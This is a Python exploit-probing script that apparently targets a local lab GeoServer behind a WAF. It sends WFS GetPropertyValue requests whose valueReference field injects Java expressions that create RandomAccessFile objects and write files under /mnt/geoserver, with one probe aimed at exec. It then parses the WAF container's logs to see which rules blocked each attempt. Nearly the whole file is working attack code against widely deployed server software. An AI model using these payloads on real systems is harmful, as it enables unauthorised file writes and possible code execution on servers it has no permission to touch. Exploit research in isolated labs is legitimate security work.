# -*- coding: utf-8 -*-
"""Dump full 500 exception text from the RandomAccessFile eval probes and the
WAF verdict for the REST PUT 403."""
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"

cases = [
    ("RAF ctor+write", "write(new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs3','rw'),'pwn3'.getBytes())"),
    ("RAF receiver", "new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs4','rw').write('pwn3'.getBytes())"),
    ("RAF bare ctor", "new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs5','rw')"),
    ("exec receiver probe", "exec(new java.io.RandomAccessFile('/mnt/geoserver/pwn_joint_gs6','rw'),'pwn6'.getBytes())"),
]
for label, v in cases:
    r = s.get(BASE + "/geoserver/ows", params={
        "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
        "typeNames": "sf:archsites", "valueReference": v}, timeout=90)
    print("=" * 20, label, "HTTP", r.status_code)
    print(r.text[:1600].replace("\n", " "))

r = subprocess.run(["docker", "logs", "multi-round-lab-waf-geoserver-1", "--since", "6m"],
                   capture_output=True, text=True, errors="replace")
import json
for line in (r.stdout or "").splitlines():
    line = line.strip()
    if not line.startswith("{"):
        continue
    try:
        j = json.loads(line)
    except Exception:
        continue
    tr = j.get("transaction", {})
    uri = str((tr.get("request", {}) or {}).get("uri", ""))
    if "rest" in uri or "ows" in uri:
        msgs = tr.get("messages") or []
        code = (tr.get("response", {}) or {}).get("http_code")
        print("WAF>", tr.get("time_stamp"), code, uri[:90],
              [str(m.get("details", {}).get("ruleId") or "?") for m in msgs])
        for m in msgs:
            d = m.get("details", {}) or {}
            print("     ", d.get("ruleId"), (m.get("message") or "")[:80], "|",
                  (d.get("match") or "")[:100])
